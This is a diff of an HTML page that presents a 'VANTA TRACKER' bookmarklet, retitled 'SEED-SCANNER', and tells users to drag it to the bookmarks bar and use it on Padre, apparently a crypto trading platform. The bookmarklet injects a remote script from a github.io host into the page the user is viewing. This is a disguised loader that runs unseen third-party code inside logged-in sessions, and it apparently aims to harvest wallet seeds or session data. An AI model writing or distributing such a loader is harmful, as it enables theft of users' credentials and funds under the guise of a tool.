@@ -2,15 +2,20 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>VANTA v19</title>
+    <title>VANTA SEED-SCANNER</title>
     <style>
-        body { background: #000; color: #00ff88; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .btn { border: 2px solid #00ff88; padding: 20px 40px; text-decoration: none; color: #00ff88; font-weight: bold; border-radius: 10px; box-shadow: 0 0 20px #00ff88; cursor: move; }
-        .btn:hover { background: #00ff88; color: #000; }
+        body { background: #070707; color: #00ff88; font-family: 'Inter', sans-serif; height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; }
+        .card { border: 1px solid #00ff88; padding: 50px; text-align: center; border-radius: 20px; box-shadow: 0 0 40px rgba(0,255,136,0.1); }
+        .btn { background: #00ff88; color: #000; padding: 20px 40px; text-decoration: none; border-radius: 10px; font-weight: 800; cursor: move; display: inline-block; }
+        p { color: #555; margin-top: 20px; font-size: 0.8rem; letter-spacing: 1px; }
     </style>
 </head>
 <body>
-    <a href="#" class="btn" id="v">VANTA v19</a>
+    <div class="card">
+        <h1>VANTA v20</h1>
+        <a href="#" class="btn" id="v">VANTA TRACKER</a>
+        <p>DRAG TO BOOKMARKS BAR • USE ON PADRE</p>
+    </div>
     <script>
         const u = "https://jinxthesimp.github.io/Dropshipper/tracker.js";
         document.getElementById('v').href = `javascript:(function(){var s=document.createElement('script');s.src='${u}?v='+Date.now();document.head.appendChild(s);})();`;
